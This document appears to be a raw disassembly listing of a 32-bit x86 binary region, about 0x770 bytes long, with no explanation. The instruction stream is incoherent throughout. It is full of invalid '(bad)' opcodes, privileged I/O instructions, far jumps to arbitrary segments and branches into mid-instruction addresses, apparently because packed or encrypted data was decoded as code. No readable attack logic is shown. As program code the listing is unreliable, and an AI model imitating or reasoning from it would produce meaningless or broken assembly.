  41e280:	sbb    eax,0xcc9c3fe1
  41e285:	inc    edi
  41e286:	out    dx,eax
  41e287:	adc    DWORD PTR [esi],esp
  41e289:	cld    
  41e28a:	sahf   
  41e28b:	mov    ebp,DWORD PTR [ecx-0x2b0ff479]
  41e291:	cld    
  41e292:	into   
  41e293:	leave  
  41e294:	test   BYTE PTR [ebx-0x23],bh
  41e297:	gs push 0x4272468c
  41e29d:	aas    
  41e29e:	sbb    DWORD PTR [ecx],ebx
  41e2a0:	iret   
  41e2a1:	into   
  41e2a2:	cmc    
  41e2a3:	mov    ecx,0x2f20f58a
  41e2a8:	sub    DWORD PTR [edx-0x34],0xf9ec551f
  41e2af:	push   eax
  41e2b0:	(bad)  
  41e2b1:	fidivr DWORD PTR [ebx+0xd]
  41e2b4:	adc    edi,DWORD PTR [edx]
  41e2b6:	inc    esp
  41e2b7:	push   cs
  41e2b8:	dec    ebp
  41e2b9:	or     edi,DWORD PTR [edi*1-0x5f67533e]
  41e2c0:	icebp  
  41e2c1:	add    al,0xc3
  41e2c3:	dec    edi
  41e2c4:	popa   
  41e2c5:	sahf   
  41e2c6:	jbe    0x41e345
  41e2c8:	mov    ah,0x52
  41e2ca:	pop    esp
  41e2cb:	jle    0x41e2c2
  41e2cd:	pusha  
  41e2ce:	cmp    eax,0xc129ff14
  41e2d3:	sbb    DWORD PTR [eax+0x40],eax
  41e2d6:	xchg   esi,eax
  41e2d7:	xchg   edx,eax
  41e2d8:	addr16 jp 0x41e2e4
  41e2db:	and    eax,0x4300026b
  41e2e0:	cs mov ecx,0xd50bef64
  41e2e6:	and    edx,DWORD PTR [esi]
  41e2e8:	int    0xc4
  41e2ea:	push   cs
  41e2eb:	inc    DWORD PTR [edx-0x2c]
  41e2ee:	push   eax
  41e2ef:	xor    al,0xf1
  41e2f1:	adc    DWORD PTR [edx+0x64a30696],esi
  41e2f7:	mov    eax,DWORD PTR [edx+0x4f]
  41e2fa:	inc    eax
  41e2fb:	adc    eax,0xe39b7c9c
  41e300:	mov    al,0xe2
  41e302:	jne    0x41e29f
  41e304:	dec    ecx
  41e305:	sub    DWORD PTR [eax],esp
  41e307:	xchg   ecx,eax
  41e308:	jl     0x41e295
  41e30a:	stc    
  41e30b:	stos   DWORD PTR es:[edi],eax
  41e30c:	(bad)  [edx-0x39]
  41e30f:	ret    
  41e310:	pushf  
  41e311:	mov    ds:0xec547980,al
  41e316:	xor    BYTE PTR [ebp+0x50],ah
  41e319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e31a:	(bad)  
  41e31b:	js     0x41e320
  41e31d:	xor    esi,DWORD PTR [edx-0x2c]
  41e320:	mov    gs:0x91c319c4,al
  41e326:	mov    WORD PTR [ecx-0x38],fs
  41e329:	sbb    eax,DWORD PTR [edi+0x7852d97]
  41e32f:	arpl   WORD PTR [edi],bp
  41e331:	das    
  41e332:	mov    dl,0x16
  41e334:	xchg   edx,eax
  41e335:	outs   dx,BYTE PTR ds:[esi]
  41e336:	adc    BYTE PTR [edi-0x21421e49],bh
  41e33c:	sub    BYTE PTR [ebx-0x56],bh
  41e33f:	scas   al,BYTE PTR es:[edi]
  41e340:	adc    cl,BYTE PTR [ecx+0x8]
  41e343:	ret    0xfee
  41e346:	lahf   
  41e347:	add    esi,DWORD PTR [ebx]
  41e349:	xchg   edi,eax
  41e34a:	sbb    al,dh
  41e34c:	jle    0x41e3a0
  41e34e:	in     eax,dx
  41e34f:	jae    0x41e30e
  41e351:	xor    DWORD PTR [ecx+0x78],edx
  41e354:	scas   al,BYTE PTR es:[edi]
  41e355:	fld    DWORD PTR [esi-0x3e]
  41e358:	sub    eax,0x55a09a97
  41e35d:	or     DWORD PTR [ecx+edx*8+0x39779de1],ebp
  41e364:	xor    al,0x91
  41e366:	fisub  WORD PTR [edi]
  41e368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e369:	dec    esi
  41e36a:	mov    al,0xb
  41e36c:	add    edi,DWORD PTR [esi-0x67]
  41e36f:	xchg   esp,eax
  41e370:	mov    edx,0xd0e05c73
  41e375:	and    eax,0x3cd16ac9
  41e37a:	mov    edi,0xdf9666d1
  41e37f:	push   esi
  41e380:	adc    eax,0x4e303e3f
  41e385:	jg     0x41e32e
  41e387:	mov    ds:0xd727e3be,al
  41e38c:	cmc    
  41e38d:	cld    
  41e38e:	cmp    DWORD PTR [ecx+edx*2+0x68],0xe46af5f7
  41e396:	and    DWORD PTR [edi+0x23],esi
  41e399:	imul   edi,esi,0x120ecfa0
  41e39f:	jle    0x41e3ee
  41e3a1:	xchg   edi,eax
  41e3a2:	xor    al,0xac
  41e3a4:	stos   DWORD PTR es:[edi],eax
  41e3a5:	fist   WORD PTR [ecx-0x68e13378]
  41e3ab:	pop    ebp
  41e3ac:	loop   0x41e383
  41e3ae:	shl    BYTE PTR [ebx],1
  41e3b0:	test   DWORD PTR [edi-0x1b],eax
  41e3b3:	push   eax
  41e3b4:	mov    eax,ds:0xd3fa90e9
  41e3b9:	sub    edi,0x85d8c74c
  41e3bf:	push   cs
  41e3c0:	xor    cl,al
  41e3c2:	cmp    edx,DWORD PTR [edx]
  41e3c4:	fs rep stos DWORD PTR es:[edi],eax
  41e3c7:	xchg   BYTE PTR [ebx+0x1cd12f90],ch
  41e3cd:	inc    ebx
  41e3ce:	or     al,0xee
  41e3d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3d1:	call   0xebb1:0x1110f66c
  41e3d8:	pop    ds
  41e3d9:	inc    eax
  41e3da:	pop    es
  41e3db:	stos   BYTE PTR es:[edi],al
  41e3dc:	add    BYTE PTR [esi+0xa8bd752],dl
  41e3e2:	or     bh,BYTE PTR [edx+0x3e]
  41e3e5:	fcomp  DWORD PTR [ebx+0x43]
  41e3e8:	icebp  
  41e3e9:	pop    ecx
  41e3ea:	call   DWORD PTR [ebx-0x33]
  41e3ed:	fiadd  WORD PTR [esi]
  41e3ef:	sub    al,0xa4
  41e3f1:	mov    dl,dl
  41e3f3:	push   edi
  41e3f4:	cmp    BYTE PTR [esi-0x7bc5fc4d],ch
  41e3fa:	jle    0x41e476
  41e3fc:	mov    ds:0x80a945ca,al
  41e401:	les    esi,FWORD PTR [esi]
  41e403:	ret    0x2018
  41e406:	cdq    
  41e407:	dec    eax
  41e408:	push   ebp
  41e409:	ja     0x41e460
  41e40b:	jecxz  0x41e469
  41e40d:	int    0x61
  41e40f:	popf   
  41e410:	(bad)  
  41e411:	and    al,0xfe
  41e413:	sbb    eax,0x8b2793a9
  41e418:	mov    ah,0x96
  41e41a:	repnz arpl cx,ax
  41e41d:	loop   0x41e46f
  41e41f:	idiv   DWORD PTR [ebx+0x79]
  41e422:	or     edx,DWORD PTR [edi]
  41e424:	mov    ecx,0x42d79b1f
  41e429:	sar    BYTE PTR [eax-0x237d9c12],0xb9
  41e430:	rcr    BYTE PTR [edx-0x7cc9099c],0x8
  41e437:	adc    DWORD PTR [ebp-0x6c],0x3e81dc11
  41e43e:	sbb    eax,0x7a25b2bc
  41e443:	jne    0x41e4ac
  41e445:	xchg   edi,eax
  41e446:	and    edi,DWORD PTR [ebp-0x58]
  41e449:	(bad)  
  41e44a:	shl    DWORD PTR [ebx],1
  41e44c:	retf   0x3272
  41e44f:	ret    
  41e450:	add    cl,dh
  41e452:	sahf   
  41e453:	lods   eax,DWORD PTR ds:[esi]
  41e454:	jg     0x41e484
  41e456:	and    BYTE PTR [ebp-0x25],dh
  41e459:	adc    DWORD PTR [esi],ebx
  41e45b:	in     eax,0x37
  41e45d:	push   ebp
  41e45e:	mov    cl,0xea
  41e460:	data16 xor bl,BYTE PTR [ebp-0x7c27bd4c]
  41e467:	aas    
  41e468:	mov    esp,0x66e6386f
  41e46d:	dec    eax
  41e46e:	jmp    FWORD PTR [edi+0x792d2f74]
  41e474:	sbb    eax,0xa8a7916e
  41e479:	mov    al,0xb6
  41e47b:	imul   BYTE PTR [esi+0x1b]
  41e47e:	aam    0xe8
  41e480:	push   cs
  41e481:	and    eax,0x6d0681bb
  41e486:	cmp    eax,0x4292f570
  41e48b:	jp     0x41e4bf
  41e48d:	xchg   esi,eax
  41e48e:	es pop edi
  41e490:	sbb    dl,BYTE PTR [edx-0x169e6be5]
  41e496:	sbb    ebp,0xf8d5cba3
  41e49c:	and    DWORD PTR [eax-0x7b7fd43d],ebp
  41e4a2:	stc    
  41e4a3:	(bad)  
  41e4a4:	push   edi
  41e4a5:	daa    
  41e4a6:	mov    al,ds:0x751ead4f
  41e4ab:	xor    DWORD PTR [ebp-0x5096851e],edx
  41e4b1:	inc    edi
  41e4b2:	xchg   DWORD PTR [ebx-0x26],ebp
  41e4b5:	fwait
  41e4b6:	imul   eax,edi,0xffffffa0
  41e4b9:	adc    eax,DWORD PTR [edi+0x9]
  41e4bc:	inc    ebp
  41e4bd:	jne    0x41e52d
  41e4bf:	cmp    BYTE PTR [esi-0x1a6b1759],bh
  41e4c5:	xor    bh,BYTE PTR [ecx-0x4bc8aaf0]
  41e4cb:	jne    0x41e507
  41e4cd:	jbe    0x41e51c
  41e4cf:	pop    es
  41e4d0:	pop    edi
  41e4d1:	push   ss
  41e4d2:	fistp  WORD PTR [ecx]
  41e4d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4d5:	jle    0x41e4e3
  41e4d7:	add    al,0x33
  41e4d9:	add    eax,0xa55706ed
  41e4de:	jl     0x41e477
  41e4e0:	and    DWORD PTR [ebp-0x28],esp
  41e4e3:	mov    bh,0xa9
  41e4e5:	fadd   QWORD PTR [edi-0x5103c21]
  41e4eb:	mov    eax,0x4b8ed3a1
  41e4f0:	jns    0x41e4a7
  41e4f2:	jo     0x41e482
  41e4f4:	dec    ebx
  41e4f5:	jmp    0x6dd0:0x95bbf483
  41e4fc:	cdq    
  41e4fd:	test   al,0xca
  41e4ff:	mov    DWORD PTR [esi+eax*8-0x20],ebx
  41e503:	repnz and edi,DWORD PTR fs:[ebx-0x28]
  41e508:	push   eax
  41e509:	pushf  
  41e50a:	int    0x99
  41e50c:	mov    dl,0x5
  41e50e:	jne    0x41e4e3
  41e510:	sub    bh,BYTE PTR [edx-0x6]
  41e513:	inc    DWORD PTR [ecx+0x5a]
  41e516:	lds    esi,FWORD PTR [bx]
  41e519:	out    0x0,eax
  41e51b:	sti    
  41e51c:	mov    ebx,0x261d64af
  41e521:	push   ebx
  41e522:	pop    ebx
  41e523:	fs push ds
  41e525:	outs   dx,BYTE PTR fs:[esi]
  41e527:	out    0x9d,al
  41e529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e52a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e52b:	xor    esi,DWORD PTR [ebp-0xc3e1e36]
  41e531:	jnp    0x41e539
  41e533:	mov    dl,ch
  41e535:	jne    0x41e564
  41e537:	ret    
  41e538:	frstor [ebx+0x5f5a559b]
  41e53e:	adc    bh,0xaf
  41e541:	mov    al,ds:0xa47ccdc1
  41e546:	sbb    BYTE PTR [ebx+0x1daa9ec5],al
  41e54c:	outs   dx,BYTE PTR ds:[esi]
  41e54d:	pusha  
  41e54e:	fstp   DWORD PTR [edx+0x6ac2576b]
  41e554:	les    ebp,FWORD PTR [ebx-0x33bf0cd6]
  41e55a:	adc    eax,DWORD PTR [edx]
  41e55c:	(bad)  
  41e55d:	fdivp  st(6),st
  41e55f:	int    0xe0
  41e561:	repz xor al,0xbb
  41e564:	xlat   BYTE PTR ds:[ebx]
  41e565:	imul   ebp,DWORD PTR ds:0x41462f30,0x54
  41e56c:	rcr    DWORD PTR [eax+0x54],0x72
  41e570:	sub    eax,0xc8e0ae40
  41e575:	mov    bl,0x29
  41e577:	pop    edx
  41e578:	mov    ah,0x0
  41e57a:	jne    0x41e5c2
  41e57c:	jae    0x41e5d4
  41e57e:	js     0x41e58d
  41e580:	push   es
  41e581:	ds int 0xa3
  41e584:	mov    ecx,0x345b5aa1
  41e589:	lods   eax,DWORD PTR ds:[esi]
  41e58a:	jae    0x41e5b1
  41e58c:	ror    DWORD PTR [ebp-0x7c],0xfa
  41e590:	scas   al,BYTE PTR es:[edi]
  41e591:	dec    ebp
  41e592:	cmp    al,BYTE PTR [edi]
  41e594:	sub    DWORD PTR [esi-0x1b],edi
  41e597:	add    BYTE PTR [esi+0x47379f1a],dh
  41e59d:	adc    BYTE PTR [esi],ah
  41e59f:	pusha  
  41e5a0:	rdpmc  
  41e5a2:	and    bh,BYTE PTR [edi+0x5f]
  41e5a5:	mov    cl,0x97
  41e5a7:	pop    esp
  41e5a8:	call   0x511b2306
  41e5ad:	dec    esp
  41e5ae:	add    eax,0x62064fe9
  41e5b3:	(bad)  
  41e5b4:	push   eax
  41e5b5:	mov    ebp,0x15447610
  41e5ba:	adc    bl,BYTE PTR [edi-0x47]
  41e5bd:	cmp    al,0x20
  41e5bf:	in     al,dx
  41e5c0:	mov    bh,0xc7
  41e5c2:	inc    esp
  41e5c3:	pop    ds
  41e5c4:	nop
  41e5c5:	cmc    
  41e5c6:	inc    ebx
  41e5c7:	add    al,0x5e
  41e5c9:	addr16 add al,0xc4
  41e5cc:	icebp  
  41e5cd:	outs   dx,BYTE PTR ds:[esi]
  41e5ce:	xchg   BYTE PTR [edi],bh
  41e5d0:	stos   DWORD PTR es:[edi],eax
  41e5d1:	out    dx,al
  41e5d2:	outs   dx,BYTE PTR ds:[esi]
  41e5d3:	shr    BYTE PTR [edx-0x4f],cl
  41e5d6:	lea    edi,gs:[esi-0x6a]
  41e5da:	cdq    
  41e5db:	dec    esp
  41e5dc:	in     eax,dx
  41e5dd:	test   BYTE PTR [ecx+0x3c],ch
  41e5e0:	pop    ebp
  41e5e1:	dec    esi
  41e5e2:	aad    0x36
  41e5e4:	pop    esp
  41e5e5:	test   DWORD PTR [edx+ecx*2+0x2718dceb],0xde9d103
  41e5f0:	add    eax,0xc6d10000
  41e5f5:	rol    eax,cl
  41e5f7:	fcmovnu st,st(1)
  41e5f9:	(bad)  
  41e5fb:	jp     0x41e5c3
  41e5fd:	or     DWORD PTR [ebp+ecx*2-0x1c29fb9c],0xffffffbf
  41e605:	jg     0x41e67f
  41e607:	jae    0x41e685
  41e609:	js     0x41e683
  41e60b:	pop    ecx
  41e60c:	pop    ebx
  41e60d:	repnz inc DWORD PTR [edi+0x45329e9e]
  41e614:	jns    0x41e5bd
  41e616:	std    
  41e617:	(bad)  
  41e618:	mov    cl,0xe
  41e61a:	ror    BYTE PTR [ebx+ecx*2],1
  41e61d:	jo     0x41e5e3
  41e61f:	and    dl,bl
  41e621:	pop    ds
  41e622:	sub    ebp,ebp
  41e624:	cmp    bh,BYTE PTR ds:0xc56aeff
  41e62a:	or     cl,BYTE PTR [ebx-0x76]
  41e62d:	(bad)  
  41e62e:	popa   
  41e62f:	in     eax,0xff
  41e631:	or     BYTE PTR [edi+0x6ead03ec],bl
  41e637:	cld    
  41e638:	and    ecx,DWORD PTR [eax-0x7f]
  41e63b:	push   edx
  41e63c:	xor    al,0x35
  41e63e:	adc    ecx,0x29
  41e641:	das    
  41e642:	mov    BYTE PTR [edi],dl
  41e644:	xchg   edi,eax
  41e645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e646:	and    edi,esi
  41e648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e649:	popa   
  41e64a:	adc    BYTE PTR [edx],0x72
  41e64d:	leave  
  41e64e:	xchg   esi,eax
  41e64f:	push   ds
  41e650:	out    dx,eax
  41e651:	mov    ebp,0xb7596794
  41e656:	cmp    DWORD PTR [ebp+0xbb27df1],eax
  41e65c:	adc    edi,DWORD PTR [edx-0x11]
  41e65f:	push   eax
  41e660:	add    eax,0x3973e0a7
  41e665:	frstor [ebp+0x6e]
  41e668:	lock arpl WORD PTR [ecx+0x14],ax
  41e66c:	hlt    
  41e66d:	pop    ss
  41e66e:	outs   dx,BYTE PTR ds:[esi]
  41e66f:	mov    bh,BYTE PTR ds:0x4c68e1a3
  41e675:	scas   al,BYTE PTR es:[edi]
  41e676:	ins    DWORD PTR es:[edi],dx
  41e677:	add    DWORD PTR [ebp+0x7aa6b63a],esi
  41e67d:	dec    edi
  41e67e:	aaa    
  41e67f:	sub    DWORD PTR [eax-0x7e],ecx
  41e682:	out    dx,eax
  41e683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e684:	mov    eax,DWORD PTR [edx]
  41e686:	dec    ecx
  41e687:	jg     0x41e6e3
  41e689:	and    eax,0xbde71518
  41e68e:	es loopne 0x41e6df
  41e691:	jnp    0x41e6b4
  41e693:	loope  0x41e61e
  41e695:	mov    BYTE PTR [eax],bl
  41e697:	daa    
  41e698:	arpl   WORD PTR [esi],ax
  41e69a:	ins    BYTE PTR es:[edi],dx
  41e69b:	sbb    al,0xaf
  41e69d:	fucomi st,st(6)
  41e69f:	and    eax,0x3ee828f8
  41e6a4:	dec    edi
  41e6a5:	mov    dh,BYTE PTR [esi-0x20e3e116]
  41e6ab:	or     DWORD PTR [edi],esp
  41e6ad:	pop    eax
  41e6ae:	xlat   BYTE PTR ds:[ebx]
  41e6af:	and    dh,BYTE PTR [ebp+ecx*1+0x30]
  41e6b3:	and    esp,DWORD PTR [ecx]
  41e6b5:	div    BYTE PTR [eax]
  41e6b7:	sbb    BYTE PTR [eax+0x785bc8d9],dl
  41e6bd:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6bf:	cwde   
  41e6c0:	popf   
  41e6c1:	dec    esi
  41e6c2:	retf   
  41e6c3:	xlat   BYTE PTR ds:[ebx]
  41e6c4:	aaa    
  41e6c5:	fmul   QWORD PTR [esp+ecx*2-0x5404b27e]
  41e6cc:	sub    eax,0xee20ec95
  41e6d1:	ss dec edx
  41e6d3:	xchg   DWORD PTR [ebp+esi*4-0x6a083459],eax
  41e6da:	std    
  41e6db:	cwde   
  41e6dc:	in     al,dx
  41e6dd:	loope  0x41e71a
  41e6df:	mov    ds:0x4247b07d,al
  41e6e4:	inc    edi
  41e6e5:	dec    ecx
  41e6e6:	repz push esp
  41e6e8:	addr16 int 0x9c
  41e6eb:	ss pop ss
  41e6ed:	out    0xc7,eax
  41e6ef:	sbb    esp,DWORD PTR [eax]
  41e6f1:	jmp    0x2e011db5
  41e6f6:	aam    0xad
  41e6f8:	arpl   cx,bp
  41e6fa:	fdivr  QWORD PTR ds:0xea02dc6e
  41e700:	sub    DWORD PTR [ebx],0x52
  41e703:	jbe    0x41e688
  41e705:	icebp  
  41e706:	jp     0x41e76c
  41e708:	jl     0x41e74f
  41e70a:	adc    BYTE PTR [eax-0x5d],0x33
  41e70e:	ja     0x41e6ba
  41e710:	ins    BYTE PTR es:[edi],dx
  41e711:	adc    al,0xe1
  41e713:	or     al,0x83
  41e715:	popa   
  41e716:	nop
  41e717:	enter  0x23f2,0x47
  41e71b:	out    dx,al
  41e71c:	(bad)  
  41e71d:	test   cl,cl
  41e71f:	jmp    0x616e:0x28e038ee
  41e726:	cwde   
  41e727:	adc    DWORD PTR [esi],edi
  41e729:	jmp    0x1144:0x5459ae28
  41e730:	jns    0x41e780
  41e732:	xor    al,0xc5
  41e734:	push   eax
  41e735:	out    0x9,al
  41e737:	mov    ah,0x6e
  41e739:	push   cs
  41e73a:	mov    eax,ss:0x60cfe265
  41e740:	add    al,0xc6
  41e742:	test   DWORD PTR es:[esi-0x2066d4a9],edx
  41e749:	daa    
  41e74a:	addr16 push ecx
  41e74c:	jg     0x41e6d4
  41e74e:	xor    al,0x0
  41e750:	cld    
  41e751:	sub    eax,0x6e78728d
  41e756:	fs inc edi
  41e758:	jge    0x41e777
  41e75a:	jecxz  0x41e6fd
  41e75c:	lahf   
  41e75d:	fiadd  WORD PTR [ebx+0x57]
  41e760:	outs   dx,DWORD PTR ds:[esi]
  41e761:	push   ebx
  41e762:	xchg   BYTE PTR [ecx+0xf4e5535],cl
  41e768:	dec    ecx
  41e769:	mov    al,0xc6
  41e76b:	(bad)  
  41e76c:	mov    esi,?
  41e76e:	mov    esi,0xd1885e9b
  41e773:	scas   eax,DWORD PTR es:[edi]
  41e774:	nop
  41e775:	or     bh,al
  41e777:	pushf  
  41e778:	out    dx,al
  41e779:	inc    esi
  41e77a:	mov    ch,0x2d
  41e77c:	mov    dl,0xf7
  41e77e:	inc    esi
  41e77f:	cwde   
  41e780:	test   DWORD PTR [eax+ebp*4-0x707fcbd4],ebp
  41e787:	ja     0x41e751
  41e789:	cdq    
  41e78a:	mov    eax,0x330e790e
  41e78f:	imul   ebx,DWORD PTR cs:[ecx+0x56],0xb8be9edf
  41e797:	add    dl,al
  41e799:	and    al,0x40
  41e79b:	xor    BYTE PTR [eax],0x79
  41e79e:	(bad)
  41e7a3:	jmp    0x662b:0xf2715948
  41e7aa:	dec    edi
  41e7ab:	adc    al,0x1c
  41e7ad:	sub    BYTE PTR [ecx],0x4b
  41e7b0:	cmp    cl,BYTE PTR [edx-0x3ca0885f]
  41e7b6:	and    eax,DWORD PTR [ebp+eiz*2+0x6a]
  41e7ba:	pop    ecx
  41e7bb:	and    eax,0x9105c41b
  41e7c0:	cdq    
  41e7c1:	cmp    DWORD PTR [esi+0x421ab7c5],0xe6b38f1b
  41e7cb:	pop    ecx
  41e7cc:	dec    edx
  41e7cd:	lock mov eax,0xf7821d41
  41e7d3:	aas    
  41e7d4:	xchg   esp,eax
  41e7d5:	rcr    DWORD PTR [esi+0x8],1
  41e7d8:	adc    DWORD PTR [edi+0x7a],0x3a7aef0d
  41e7df:	iret   
  41e7e0:	push   edi
  41e7e1:	outs   dx,DWORD PTR ds:[esi]
  41e7e2:	pop    esp
  41e7e3:	pop    DWORD PTR [esi-0x54]
  41e7e6:	sar    BYTE PTR [ecx+0x124f54ce],1
  41e7ec:	mov    ch,0x33
  41e7ee:	mov    ebp,0x66e50ec2
  41e7f3:	into   
  41e7f4:	xchg   ebx,eax
  41e7f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7f6:	jne    0x41e7fa
  41e7f8:	into   
  41e7f9:	sub    eax,0xf08ef10e
  41e7fe:	pop    eax
  41e7ff:	in     al,0x10
  41e801:	pop    edi
  41e802:	or     BYTE PTR [edx],bl
  41e804:	xchg   ecx,eax
  41e805:	inc    esp
  41e806:	push   cs
  41e807:	xchg   ebx,eax
  41e808:	retf   0x16d8
  41e80b:	pop    es
  41e80c:	aaa    
  41e80d:	dec    ecx
  41e80e:	shr    BYTE PTR [ebx+esi*4+0x3a4a8944],0x38
  41e816:	xor    BYTE PTR [esp+edx*4],0xfd
  41e81a:	fsub   QWORD PTR [ecx-0x59c4c14e]
  41e820:	frstor [esi]
  41e822:	push   ds
  41e823:	add    eax,0xac1dfdf6
  41e828:	push   ss
  41e829:	push   edi
  41e82a:	nop
  41e82b:	es stc 
  41e82d:	sar    DWORD PTR [ebx+esi*2+0x57],0x6a
  41e832:	fwait
  41e833:	xchg   ebx,eax
  41e834:	ins    DWORD PTR es:[edi],dx
  41e835:	aas    
  41e836:	mov    ebp,0xba328969
  41e83b:	jmp    0x1563bae9
  41e840:	inc    esi
  41e841:	fcomp  DWORD PTR [ecx-0x21]
  41e844:	ds adc eax,0x7fbd6026
  41e84a:	sbb    al,0xc5
  41e84c:	aad    0xd2
  41e84e:	adc    BYTE PTR [edx],dh
  41e850:	test   al,0x55
  41e852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e853:	add    ebp,DWORD PTR [esi-0x73709dba]
  41e859:	cmp    cl,bl
  41e85b:	or     eax,DWORD PTR [edi+0x3a5ef07a]
  41e861:	stos   BYTE PTR es:[edi],al
  41e862:	sub    edx,DWORD PTR [edx-0xe]
  41e865:	cmp    al,0x5e
  41e867:	and    dh,BYTE PTR [eax]
  41e869:	push   0x39
  41e86b:	sar    BYTE PTR [edi-0x1b],0x34
  41e86f:	jo     0x41e828
  41e871:	inc    esp
  41e872:	cmp    bl,bl
  41e874:	adc    bl,BYTE PTR [ebx+0x3f45f2a1]
  41e87a:	jne    0x41e87e
  41e87c:	inc    eax
  41e87d:	cmp    eax,0xe198ec1f
  41e882:	dec    esp
  41e883:	mov    BYTE PTR [ecx+0x1e],0x81
  41e887:	out    0xcd,al
  41e889:	jmp    0x41e842
  41e88b:	mov    DWORD PTR [ebx-0x33],ebp
  41e88e:	mov    cl,0xbb
  41e890:	hlt    
  41e891:	sub    al,0x12
  41e893:	loopne 0x41e832
  41e895:	fisubr DWORD PTR [eax+0x455dc102]
  41e89b:	popf   
  41e89c:	jne    0x41e912
  41e89e:	rol    BYTE PTR [ecx-0x6b4d383a],cl
  41e8a4:	xchg   esi,eax
  41e8a5:	scas   al,BYTE PTR es:[edi]
  41e8a6:	repnz (bad) 
  41e8a8:	pop    DWORD PTR [edx+0x42]
  41e8ab:	popf   
  41e8ac:	xchg   esi,eax
  41e8ad:	repnz lahf 
  41e8af:	pop    esi
  41e8b0:	jmp    0x245846a3
  41e8b5:	enter  0xc202,0xa2
  41e8b9:	cmp    eax,0xaeed116c
  41e8be:	lea    eax,[ecx*4-0x304c4e6c]
  41e8c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8c6:	je     0x41e8f2
  41e8c8:	fisttp QWORD PTR [ebx+0xacbebb9]
  41e8ce:	push   ds
  41e8cf:	fucomi st,st(0)
  41e8d1:	ins    DWORD PTR es:[edi],dx
  41e8d2:	(bad)  
  41e8d3:	sbb    cl,BYTE PTR [esi+ebx*1]
  41e8d6:	dec    ecx
  41e8d7:	lods   eax,DWORD PTR ds:[esi]
  41e8d8:	inc    edx
  41e8d9:	cmp    DWORD PTR [edx],edi
  41e8db:	iret   
  41e8dc:	mov    al,0x27
  41e8de:	call   0xb9f2101e
  41e8e3:	adc    DWORD PTR ds:0x2e52a35a,ebx
  41e8e9:	cs call 0x483e:0x8b93964d
  41e8f1:	adc    DWORD PTR [ebx-0x72ce5008],esi
  41e8f7:	xchg   DWORD PTR [edx+0x59],esp
  41e8fa:	dec    ebx
  41e8fb:	jo     0x41e8e6
  41e8fd:	jae    0x41e889
  41e8ff:	and    bh,dh
  41e901:	push   ecx
  41e902:	or     eax,0x2fd46006
  41e907:	xor    dh,BYTE PTR [ebp-0xb]
  41e90a:	xor    BYTE PTR [eax+0x1b854bea],dl
  41e910:	out    dx,al
  41e911:	adc    eax,0xed472298
  41e916:	cmc    
  41e917:	(bad)  
  41e918:	imul   DWORD PTR [edx+0x995bfe2]
  41e91e:	cmp    al,0x13
  41e920:	pop    ebp
  41e921:	out    0xa2,al
  41e923:	jnp    0x41e968
  41e925:	and    BYTE PTR [eax+ecx*8],dl
  41e928:	or     al,0xcf
  41e92a:	mov    edi,0x59660c91
  41e92f:	int    0xaf
  41e931:	cmp    al,0x2a
  41e933:	dec    esp
  41e934:	jge    0x41e913
  41e936:	retf   
  41e937:	add    BYTE PTR [esi+0x20],dh
  41e93a:	xchg   esp,eax
  41e93b:	test   al,0x33
  41e93d:	lahf   
  41e93e:	aaa    
  41e93f:	sahf   
  41e940:	add    eax,0x1b0e9d51
  41e945:	leave  
  41e946:	inc    edi
  41e947:	and    BYTE PTR [edi-0x6d],ah
  41e94a:	lods   al,BYTE PTR ds:[esi]
  41e94b:	retf   0x599e
  41e94e:	rcl    eax,cl
  41e950:	in     al,dx
  41e951:	push   esp
  41e952:	mov    edi,0x27d1effd
  41e957:	adc    al,al
  41e959:	in     al,0x42
  41e95b:	(bad)  
  41e95c:	out    0x99,al
  41e95e:	out    dx,al
  41e95f:	bound  esi,QWORD PTR [ecx-0x18]
  41e962:	xchg   esi,eax
  41e963:	ds addr16 (bad) 
  41e966:	imul   edi,DWORD PTR [edi-0x22cc351b],0x2f886880
  41e970:	mov    cl,0x64
  41e972:	adc    bl,BYTE PTR [edi+0x2]
  41e975:	test   eax,0x1b711b95
  41e97a:	in     al,dx
  41e97b:	mov    edi,0x962aaf33
  41e980:	lock call 0x1a216f42
  41e986:	pop    esp
  41e987:	and    bl,BYTE PTR ds:0x4c64bbe7
  41e98d:	sub    al,BYTE PTR [esi+0x19]
  41e990:	inc    ebx
  41e991:	pop    ebx
  41e992:	retf   0x61b8
  41e995:	mov    cl,0x3a
  41e997:	ins    DWORD PTR es:[edi],dx
  41e998:	inc    BYTE PTR [edx-0x7f22244e]
  41e99e:	push   ebx
  41e99f:	push   esp
  41e9a0:	cld    
  41e9a1:	test   BYTE PTR [eax],cl
  41e9a3:	jg     0x41e9a2
  41e9a5:	rcr    dl,cl
  41e9a7:	mov    cl,0x93
  41e9a9:	pop    esp
  41e9aa:	adc    eax,DWORD PTR ds:0x3e5162ee
  41e9b0:	dec    ecx
  41e9b1:	mov    dh,0x72
  41e9b3:	cwde   
  41e9b4:	jmp    0x41e9ff
  41e9b6:	mov    cl,0x8f
  41e9b8:	push   ds
  41e9b9:	inc    ebp
  41e9ba:	xchg   ebx,eax
  41e9bb:	stc    
  41e9bc:	dec    ebx
  41e9bd:	xchg   esp,eax
  41e9be:	sub    DWORD PTR [edx],ebx
  41e9c0:	mov    ecx,0x71309549
  41e9c5:	sti    
  41e9c6:	sub    dl,BYTE PTR [eax+0x41265f05]
  41e9cc:	sbb    DWORD PTR [esi],ebp
  41e9ce:	idiv   DWORD PTR [edi-0x37]
  41e9d1:	mov    ecx,0xc94da7f8
  41e9d6:	fsub   DWORD PTR [ecx+edx*8]
  41e9d9:	out    0x41,eax
  41e9db:	test   dl,ch
  41e9dd:	adc    edx,ecx
  41e9df:	push   ss
  41e9e0:	in     eax,dx
  41e9e1:	jne    0x41e990
  41e9e3:	push   edx
  41e9e4:	pop    ss
  41e9e5:	or     DWORD PTR [ebp-0x311dc9a2],esi
  41e9eb:	cmp    eax,0xd617d17b
